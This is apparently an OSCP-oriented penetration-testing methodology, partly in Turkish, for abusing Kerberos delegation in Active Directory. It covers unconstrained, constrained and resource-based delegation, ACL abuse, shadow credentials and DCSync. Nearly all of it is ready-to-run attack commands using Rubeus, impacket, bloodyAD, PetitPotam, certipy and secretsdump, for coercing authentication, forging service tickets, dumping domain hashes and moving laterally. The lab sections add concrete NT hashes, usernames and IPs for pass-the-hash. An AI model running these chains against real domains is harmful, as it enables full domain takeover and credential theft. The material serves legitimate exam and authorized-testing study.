# Kerberos Delegation Abuse — OSCP-Ready Methodology

Covers Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD), plus the ACL chains that create or exploit them. Ordered as you'd actually work it: **enumerate → identify delegation type → branch → exploit → cleanup**.

---

## 1. Recon — Find Every Delegation-Related Object First

Do this in one enumeration pass before deciding which branch (Unconstrained/Constrained/RBCD) to chase.

```bash
# PowerView (from a Windows foothold or via evil-winrm)
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto
Get-DomainComputer -Properties dnshostname,msds-allowedtoactonbehalfofotheridentity | ? {$_.'msds-allowedtoactonbehalfofotheridentity'}
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainUser -AllowDelegation -Properties samaccountname,useraccountcontrol   # excludes "sensitive/cannot be delegated" accounts

# Linux side — bloodyAD (no need to drop to Windows)
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> get search --filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -a sAMAccountName    # unconstrained
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> get search --filter "(msDS-AllowedToDelegateTo=*)" -a sAMAccountName msDS-AllowedToDelegateTo    # constrained
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> get search --filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -a sAMAccountName    # RBCD already set

# ldapsearch (no creds needed for LDAP binds if anonymous allowed; otherwise -x -D/-w)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w '<password>' -b "DC=<dom>,DC=<tld>" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w '<password>' -b "DC=<dom>,DC=<tld>" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# NetExec (quick sweep across the domain)
nxc ldap <dc-ip> -u <user> -p <password> --trusted-for-delegation
nxc ldap <dc-ip> -u <user> -p <password> -M delegation      # module surfaces all three types + ACL-based RBCD candidates
```

**Decision point:**

|Enumeration result|Branch|
|---|---|
|`userAccountControl` includes `TRUSTED_FOR_DELEGATION` (0x80000) on a computer/user|→ **Section 2: Unconstrained Delegation**|
|`msDS-AllowedToDelegateTo` populated on an account you control/can compromise|→ **Section 3: Constrained Delegation**|
|`msDS-AllowedToActOnBehalfOfOtherIdentity` already populated|→ jump straight to S4U2Self/S4U2Proxy in **Section 4**|
|No delegation set anywhere, but you have `GenericWrite`/`GenericAll`/`WriteDacl`/`WriteOwner`/`AddSelf`/`Validated-SPN` on a computer object|→ **Section 5: ACL → RBCD chain** (build delegation yourself)|

---

## 2. Unconstrained Delegation

`TRUSTED_FOR_DELEGATION` on the host means any TGT that authenticates to it gets cached in LSASS on that box. Goal: get a high-value account (ideally DC$ or a Domain Admin) to auth to the compromised box, then steal the TGT.

```bash
# Confirm which SPN/service the box runs (often print spooler, RDP, file share)
netexec smb <target-ip> -u <user> -p <password> --spider-plus

# 1) Compromise the unconstrained-delegation host, get a foothold (any code exec method)
evil-winrm -i <target-ip> -u <user> -p '<password>'

# 2) Monitor for incoming TGTs (Rubeus, from the compromised box)
Rubeus.exe monitor /interval:5 /nowrap

# 3) Coerce a privileged account (or the DC$ machine account) to authenticate to you
#    Classic pairing: PetitPotam / PrinterBug / Coercer -> forces DC to auth over Kerberos
python3 PetitPotam.py -u <user> -p '<password>' -d <domain> <listener-ip-or-compromised-host> <dc-ip>
python3 Coercer.py coerce -u <user> -p '<password>' -d <domain> -l <listener-ip> -t <dc-ip>

# 4) Rubeus captures the DC$ TGT automatically via monitor; or dump all cached tickets
Rubeus.exe dump /nowrap
Rubeus.exe dump /service:krbtgt /nowrap

# 5) Inject the stolen DC$ TGT and DCSync
Rubeus.exe ptt /ticket:<base64-ticket>
secretsdump.py -k -no-pass <dc-fqdn>
# or, without injecting, straight into impacket:
secretsdump.py -k -no-pass -target-ip <dc-ip> <domain>/<DC-hostname>\$@<dc-fqdn>
```

**Note:** printer spooler-based coercion (PrinterBug) requires Spooler running on target; PetitPotam works via EFSRPC even with Spooler off (patched on modern DCs — check for the MS-EFSR fix, fall back to alternate named pipes with the `-pipe` flag).

---

## 3. Constrained Delegation (S4U2Self + S4U2Proxy)

Account has `msDS-AllowedToDelegateTo` = list of SPNs it's allowed to impersonate users _to_. If you compromise that account (password or NT hash), you can impersonate **any user** (unless protected) to the allowed service.

```bash
# Confirm the delegation target list
Get-DomainComputer -Identity <svc-account$> -Properties msds-allowedtodelegateto
# or
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> get object <svc-account$> --attr msDS-AllowedToDelegateTo

# Check UAC for TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition) — needed for S4U2Self to work with just a password/hash (no prior TGT from target user)
Get-DomainComputer -Identity <svc-account$> -Properties useraccountcontrol

# Rubeus — full chain in one shot (S4U2Self -> S4U2Proxy), impersonating a privileged user
Rubeus.exe s4u /user:<svc-account$> /rc4:<NTLM-hash-of-svc-account> /impersonateuser:administrator /msdsspn:<allowed-spn-e.g.-cifs/dc01.domain.local> /altservice:cifs,ldap,host,http /ptt

# If you only have the plaintext password, get the NT hash first
python3 -c "import hashlib; print(hashlib.new('md4', '<password>'.encode('utf-16le')).hexdigest())"

# Impacket equivalent — getST.py does S4U2Self+S4U2Proxy in one call
getST.py -spn cifs/<target-fqdn> -impersonate administrator -dc-ip <dc-ip> '<domain>/<svc-account>:<password>'
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass -dc-ip <dc-ip> <domain>/administrator@<target-fqdn>
```

**Decision point:** `/altservice` in Rubeus lets you swap the SPN's service class after obtaining the ticket (e.g. delegation only lists `cifs/dc01` but you swap to `ldap/dc01` for DCSync) — **only works if the SPN's hostname is a Domain Controller** (well-known ticket-forging quirk, not universal).

**Protection check:** if the target user (e.g. a Domain Admin) has `Account is sensitive and cannot be delegated` set, S4U2Proxy will fail for them — pick a different high-value, non-protected account, or pivot to Unconstrained/RBCD instead.

---

## 4. Resource-Based Constrained Delegation (RBCD) ⭐

RBCD is set **on the target resource**, not the delegating account: `msDS-AllowedToActOnBehalfOfOtherIdentity` on the computer object lists which principals may impersonate users _to it_. If you control (or can create) a principal with an SPN, and have write access to that attribute on the target, you can pivot straight to that machine as any user.

```bash
# 1) Do you have MachineAccountQuota available, or an existing computer/service account you control?
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> get object <domain-dn> --attr ms-DS-MachineAccountQuota

# 2) If quota > 0 and no controllable machine account exists, create one (impacket)
addcomputer.py -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd123!' -dc-host <dc-fqdn> '<domain>/<user>:<password>'
# or bloodyAD
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> add computer 'ATTACKERPC$' 'Passw0rd123!'

# 3) Requires GenericWrite / GenericAll / WriteDacl / WriteOwner / self-membership on the TARGET computer object
#    to set msDS-AllowedToActOnBehalfOfOtherIdentity. See Section 5 if you need to get there via ACL abuse first.
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> add rbcd <target-computer$> 'ATTACKERPC$'
# or PowerView
$sid = (Get-DomainComputer ATTACKERPC$).objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdbytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdbytes, 0)
Get-DomainComputer <target-computer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdbytes}

# 4) Now S4U2Self + S4U2Proxy AS the machine account you control, impersonating a privileged user
Rubeus.exe s4u /user:ATTACKERPC$ /rc4:<ATTACKERPC$-NTLM-hash> /impersonateuser:administrator /msdsspn:cifs/<target-fqdn> /ptt

# Impacket
getST.py -spn cifs/<target-fqdn> -impersonate administrator -dc-ip <dc-ip> '<domain>/ATTACKERPC$:Passw0rd123!'
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass -dc-ip <dc-ip> <domain>/administrator@<target-fqdn>
```

**Decision point:** if `MachineAccountQuota` is `0` and you don't already control an account with an SPN — you can't add a new machine account. Fall back to a **user account you control** as the RBCD principal instead of a computer account (works identically, just uses the user's hash in `/rc4`).

---

## 5. ACL → Delegation Chain ⭐

The RBCD/`msDS-AllowedToDelegateTo` write itself is often only possible because of a **prior ACL abuse** finding. This is the enumeration-to-exploitation glue step — chase it whenever BloodHound/PowerView shows edges into a computer object.

```bash
# BloodHound query equivalent (or from raw ACL enum) — find what you already have rights to
Get-DomainObjectAcl -Identity <target-computer> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (ConvertTo-SID <your-user>)}

# netexec ACL module sweep
nxc ldap <dc-ip> -u <user> -p <password> -M daclread -o TARGET_DN='CN=<target-computer>,CN=Computers,DC=<dom>,DC=<tld>'
```

|ACL right you hold on target computer/user object|Resulting action|
|---|---|
|`GenericAll`|Full control — reset password (users) or set RBCD directly (computers), or add yourself to admin-equivalent group|
|`GenericWrite`|Write `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) directly, or write `servicePrincipalName` to enable Kerberoasting on a user|
|`WriteDacl`|Grant yourself `GenericAll` first, then proceed as above|
|`WriteOwner`|Take ownership → grant yourself `WriteDacl` → `GenericAll`|
|`AddSelf` / self-membership on a group|Add your controlled principal to a group with delegation rights, then proceed via that group's effective permissions|
|`Validated-SPN`|Write your own SPN onto a user account you control — combine with RBCD to make that user your delegation principal|

```bash
# GenericWrite/GenericAll -> straight to RBCD (fastest path, skip re-deriving Section 4 steps)
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> add rbcd <target-computer$> <your-controlled-principal$>

# WriteDacl -> grant yourself GenericAll first
Add-DomainObjectAcl -TargetIdentity <target-computer> -PrincipalIdentity <your-user> -Rights All
# bloodyAD equivalent
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> add genericAll <target-computer> <your-user>

# WriteOwner -> take ownership, then WriteDacl, then GenericAll
Set-DomainObjectOwner -TargetIdentity <target-computer> -PrincipalIdentity <your-user>
Add-DomainObjectAcl -TargetIdentity <target-computer> -PrincipalIdentity <your-user> -Rights WriteDacl
Add-DomainObjectAcl -TargetIdentity <target-computer> -PrincipalIdentity <your-user> -Rights All
```

After any of these, continue at **Section 4, step 3/4** (set RBCD → S4U chain → `/ptt`).

---

## 6. SPN ↔ Delegation Cross-Reference (Quick Lookup)

```bash
# Which service accounts exist and what SPNs they hold (needed to pick /msdsspn target)
setspn -T <domain> -Q */*
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip>

# Which SPN classes actually matter for S4U2Proxy targeting (pick based on end goal):
#   cifs/<host>  -> file share access, secretsdump via \\host\ADMIN$
#   ldap/<host>  -> DCSync if target is a DC (secretsdump.py -just-dc)
#   host/<host>  -> WMI / PsExec-style code exec
#   http/<host>  -> WinRM (needs http, not wsman, as the SPN class in older impacket versions)
```

---

## 7. Cleanup / OPSEC (Do This Even on Exam Boxes)

```bash
# Remove RBCD you added, once done
bloodyAD -d <domain> -u <user> -p <password> --host <dc-ip> remove rbcd <target-computer$> <your-principal$>
# Remove the machine account you created, if not needed for report evidence
python3 -c "from impacket... " # or: samr-based removal, or just document + leave for report if exam allows
# Revert any ACL grants you added (GenericAll/WriteDacl abuse) back to original state
Add-DomainObjectAcl -TargetIdentity <target-computer> -PrincipalIdentity <your-user> -Rights All -Remove
```

---

## Priority Fast-Path Summary (Try in This Order)

1. **RBCD via existing ACL write** (`GenericWrite`/`GenericAll` on a computer object) — most common finding in modern AD labs/exam, fastest full chain (Sections 5 → 4).
2. **Constrained Delegation abuse** on a compromised service account with `msDS-AllowedToDelegateTo` set — second most common, single Rubeus/impacket command.
3. **RBCD via new machine account** (MachineAccountQuota > 0) when no existing controllable principal has an SPN.
4. **Unconstrained Delegation + coercion** (PetitPotam/PrinterBug) — highest yield when it hits (often lands DA directly via DC$ TGT) but noisier and requires an unpatched coercion vector.
5. Always re-run the **Section 1 sweep** after every new credential/account compromise — new delegation edges appear as you gain footholds.

---

**Report note:** document the specific enumeration output that revealed each delegation edge (the `msDS-*` attribute value or the ACL right + tool output) before the exploitation command — OSCP grading requires the "why," not just the successful ticket.

---

# Delegation Abuse -> DCSync

```sh
.\Rubeus.exe tdtgeleg /nowrap
```

Write it to `ticket.b64`

```sh
cat ticket.b64 | base64 -d > ticket.kirbi

kirbi2ccache ticket.kirbi ticket.ccache

sudo ntpdate -u <domain>

KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass <machine>.<domain> -just-dc-user Administrator -target-ip <target-ip>
```

```sh
impacket-psexec Administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

---
# GenericAll → Domain Controller Computer Object — Metodoloji

**Senaryo:** Bir DC'nin computer object'i (`ResourceDC$`) üzerinde `GenericAll` var. Amaç: bunu tam domain compromise'a (DCSync) çevirmek.

**Neden RBCD'yi doğrudan atlamıyoruz:** DC$ hesabı zaten `DS-Replication-Get-Changes-All` hakkına doğal olarak sahip. Asıl mesele DC$ **olarak** authenticate olabilmek. İki yol var — sırayla dene.

---

## 0. Ön kontrol — GenericAll'ı doğrula

```bash
bloodyAD --host <dc-ip> -d resourced.local -u <user> -p <pass> get object 'ResourceDC$' --attr nTSecurityDescriptor
```

veya BloodHound'da edge'i teyit et. `dacledit.py` ile de ACL'i okuyabilirsin:

```bash
dacledit.py -action read -target 'ResourceDC$' 'resourced.local'/<user>:<pass>
```

**Decision point:** GenericAll teyit edilmediyse durma noktası burası — yanlış object üzerinde ilerleme.

---

## YOL 1 — Shadow Credentials (öncelikli dene)

Daha az adım, ekstra makine hesabı gerektirmez, AD CS/PKINIT çalışan ortamda çoğu zaman doğrudan sonuç verir.

### Adım 1 — Sahte key credential ekle ve PKINIT ile TGT al

```bash
certipy shadow auto -u '<user>@<domain>' -p '<pass>' -account 'ResourceDC$' -dc-ip <dc-ip>
```

```sh
certipy-ad shadow auto -u 'l.livingstone@resourced.local' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -account 'RESOURCEDC$' -dc-ip 192.168.212.175 -dc-host 'RESOURCEDC.resourced.local' -ldap-scheme ldap -ldap-port 389 -debug
```

**Decision point:**

|Sonuç|Sonraki adım|
|---|---|
|NT hash döndü (PKINIT başarılı)|Adım 2'ye geç — direkt DCSync|
|`KDC_ERR_CERTIFICATE` / cert mapping hatası|AD CS PKINIT düzgün çalışmıyor → YOL 2'ye (RBCD) geç|
|`msDS-KeyCredentialLink` yazımı "access denied"|GenericAll aslında object üzerinde değil / farklı bir ACE — ACL'i tekrar oku|

### Adım 2 — NT hash ile DCSync

```bash
secretsdump.py -hashes :<NT_hash> 'resourced.local'/'ResourceDC$'@<dc-ip>
```

Bu tek komut krbtgt dahil tüm domain hash'lerini çeker → domain tam ele geçmiş demektir. **Buraya geldiysen metodoloji biter, RBCD'ye gerek yok.**

### Temizlik (opsiyonel, iz bırakmamak için)

```bash
certipy shadow remove -u '<user>@resourced.local' -p '<pass>' -account 'ResourceDC$' -dc-ip <dc-ip>
```

---

## YOL 2 — RBCD (Shadow Credentials çalışmazsa)

```sh
USER HASH
   ↓
RBCD
   ↓
ATTACKER$
   ↓
getST / S4U
   ↓
CIFS TICKET
   ↓
secretsdump
   ↓
ADMIN NT HASH
   ↓
PtH → WinRM
```

### Adım 1 — Kontrol edilebilir bir SPN'li hesap oluştur

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Passw0rd123!' 'resourced.local'/<user>:<pass> -dc-ip <dc-ip>
```

```sh
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.246.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACKER$' -computer-pass 'Attacker123'
```

**Decision point:**

|Sonuç|Sonraki adım|
|---|---|
|Başarılı|Adım 2'ye geç|
|`ms-DS-MachineAccountQuota=0` veya "access denied"|Kendi kontrolündeki mevcut bir user/service account'u delegate-from olarak kullan; o da yoksa RBCD yolu tıkanmış demektir, YOL 1'e dönmeyi tekrar dene (farklı bir CA / template kontrolü ile)|

### Adım 2 — msDS-AllowedToActOnBehalfOfOtherIdentity'yi set et

```sh
impacket-rbcd \
  -delegate-to 'RESOURCEDC$' \
  -delegate-from 'ATTACKER$' \
  -action write \
  'resourced.local/l.livingstone' \
  -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \
  -dc-ip 192.168.212.175
```

```bash
rbcd.py -delegate-to 'ResourceDC$' -delegate-from 'FAKE01$' -action write 'resourced.local'/<user>:<pass> -dc-ip <dc-ip>
```

```sh
python3 rbcd.py \
  -delegate-to 'ResourceDC$' \
  -delegate-from 'FAKE01$' \
  -action write \
  'resourced.local/l.livingstone' \
  -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \
  -dc-ip 192.168.212.175
```

**Decision point:** "access denied" alırsan GenericAll'ın gerçekten bu object'te olduğunu `dacledit.py -action read -target 'ResourceDC$'` ile tekrar doğrula.

### Adım 3 — S4U2Self + S4U2Proxy, Administrator olarak servis bileti al

```bash
getST.py -spn 'cifs/ResourceDC.RESOURCED.LOCAL' -impersonate 'Administrator' 'resourced.local'/'FAKE01$':'Passw0rd123!' -dc-ip <dc-ip>
```

```sh
impacket-getST \
  -spn 'cifs/RESOURCEDC.RESOURCED.LOCAL' \
  -impersonate Administrator \
  'resourced.local/ATTACKER$:Attacker123' \
  -dc-ip 192.168.212.175
```

DCSync hedefliyorsan doğrudan LDAP servisi için de bilet al:

```bash
getST.py -spn 'ldap/ResourceDC.RESOURCED.LOCAL' -impersonate 'Administrator' 'resourced.local'/'FAKE01$':'Passw0rd123!' -dc-ip <dc-ip>
```

### Adım 4 — Bileti kullan ve DCSync çek

```sh
export KRB5CCNAME="$PWD/Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL.ccache"
```

```sh
klist
```

```bash
impacket-secretsdump \
  -k \
  -no-pass \
  -dc-ip 192.168.212.175 \
  -just-dc-user Administrator \
  'RESOURCEDC.RESOURCED.LOCAL'
```

veya CIFS bileti ile dosya sistemi/PsExec tarzı erişim:

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass 'ResourceDC.RESOURCED.LOCAL'
```

check:

```sh
nxc winrm 192.168.212.175 \
  -u Administrator \
  -H '<NTHASH>'
```
### Temizlik (opsiyonel)

```bash
rbcd.py -delegate-to 'ResourceDC$' -delegate-from 'FAKE01$' -action remove 'resourced.local'/<user>:<pass> -dc-ip <dc-ip>
```

---

## Kaçınılması gereken GenericAll kullanımları (bu hedefte)

|Aksiyon|Neden kaçın|
|---|---|
|DC$ hesabının şifresini `changepasswd.py` ile değiştirmek|Kerberos/replikasyon trust'ını bozar, DC domain'den düşebilir — production'da asla, sadece izole lab'da|
|Grup üyeliği / privilege ekleme|Anlamsız — DC$ zaten replikasyon hakkına sahip, asıl mesele o hesap **olarak** authenticate olmak|
|Object'i silmek|Geri dönüşü yok, DC'yi bozar|

---

## Öncelik sıralı hızlı özet (exam/gerçek ortamda önce bunu dene)

1. **Shadow Credentials → PKINIT → NT hash → DCSync** (en hızlı, en az iz, en yüksek başarı oranı)
2. **RBCD (addcomputer → rbcd.py → S4U2Self/Proxy → DCSync)** (Shadow Creds AD CS/PKINIT kısıtlıysa)
3. Şifre değiştirme / grup üyeliği — sadece izole lab'da, production'da yapma

**Not:** Her komutu hangi enumeration bulgusunun (GenericAll edge'i BloodHound'da/dacledit çıktısında görülmesi) tetiklediğini rapor için not al — OSCP raporu "neden bu komutu çalıştırdın" sorusuna cevap ister, sadece exploit başarısı yetmez.